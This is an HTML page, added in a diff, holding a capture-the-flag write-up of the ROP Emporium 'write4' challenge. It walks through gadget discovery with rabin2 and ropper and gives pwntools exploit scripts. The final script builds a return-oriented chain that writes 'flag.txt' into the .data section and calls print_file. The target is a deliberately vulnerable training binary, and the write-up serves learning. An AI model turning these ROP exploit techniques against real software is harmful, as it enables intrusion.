@@ -1,0 +1,121 @@
+<html>                             
+<head>
+<link rel="stylesheet" href="../style.css">
+</head>
+<body>
+<pre>
+
+<h1>ROP Emporium Pt. 4: write4</h1>
+<r>SPOILER WARNING: This page will contain potential spoilers, so consider that
+before continuing</r>
+
+<a href="https://ropemporium.com">ROP Emporium</a> is a collection of challenges designed to teach return-oriented 
+programming (ROP) techniques by slowly introducing new concepts and increasing 
+difficulty. If you're looking for a spoiler-free guide, check out the one 
+included on their <a href="https://ropemporium.com/guide.html">website</a>. 
+
+To solve this challenge we need to pass the location of our flag.txt to the 
+print_file() function as an argument. We can start by looking at our functions.
+
+rabin2
+────────────────────────────────────────────────────
+  $ rabin2 -i ./write4
+  [Imports]
+  nth vaddr      bind   type   lib name
+  ―――――――――――――――――――――――――――――――――――――
+  1   0x00400500 GLOBAL FUNC       pwnme
+  2   ---------- GLOBAL FUNC       __libc_start_main
+  3   ---------- WEAK   NOTYPE     __gmon_start__
+  4   0x00400510 GLOBAL FUNC       print_file
+────────────────────────────────────────────────────
+
+We're going to want to pass our argument to %rdi, so we can also look at 
+gadgets with Ropper or something similar.
+
+ropper
+───────────────────────────────────
+  0x0000000000400693: pop rdi; ret;
+───────────────────────────────────
+
+We can try writing a payload using our same methods as before.
+
+exploit.py
+────────────────────────────────────────────────────────────────────
+  from pwn import *
+
+  e = ELF('write4')
+  p = process(e.path)
+  context(arch='amd64', os='linux', endian='little')
+
+  payload = b'A' * 40 + p64(0x400693) + b"flag.txt" + p64(0x400510)
+
+  p.sendline(payload)
+  log.info(p.clean())
+───────────────────────────────────────────────────────────────────
+
+And, it does not work. Reading through the challenge hint will tell us that we 
+need to write our string into memory somehow. So we'll look for code to do 
+that.
+
+ropper
+────────────────────────────────────────────────────
+  0x0000000000400628: mov qword ptr [r14], r15; ret;
+────────────────────────────────────────────────────
+
+This gadget should write what's in r15 to the location of r14. So we can make 
+r15 our "flag.txt" string and r14 a read-write section of memory.
+
+We'll need another to set r14 and r15.
+
+ropper
+────────────────────────────────────────────
+  0x0000000000400690: pop r14; pop r15; ret;
+────────────────────────────────────────────
+
+We can then use radare to list out read-write sections of memory to write our 
+string into. Anything read-write with enough space should work.
+
+rabin2
+──────────────────────────────────────────────────────────────────────
+  $ rabin2 -S ./write4 | grep rw
+
+  18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
+  19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
+  20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
+  21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
+  22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
+  23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
+  24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
+──────────────────────────────────────────────────────────────────────
+
+Now we have all of the pieces to put together our exploit.
+
+exploit.py
+────────────────────────────────────────────────────
+from pwn import *
+
+  e = ELF('write4')
+  p = process(e.path)
+  context(arch='amd64', os='linux', endian='little')
+  
+  payload = b'A' * 40
+  payload += p64(0x400690) # pop r14 pop r15
+  payload += p64(0x601028) #.data
+  payload += b"flag.txt" 
+  payload += p64(0x400628) # mov qword
+  payload += p64(0x400693) # pop rdi
+  payload += p64(0x601028)
+  payload += p64(0x400510) # print_file
+
+  print(payload)
+
+  p.sendline(payload)
+  log.info(p.clean())
+────────────────────────────────────────────────────
+
+See part 5 for more.
+
+// END //
+</pre>
+</body>
+</html>
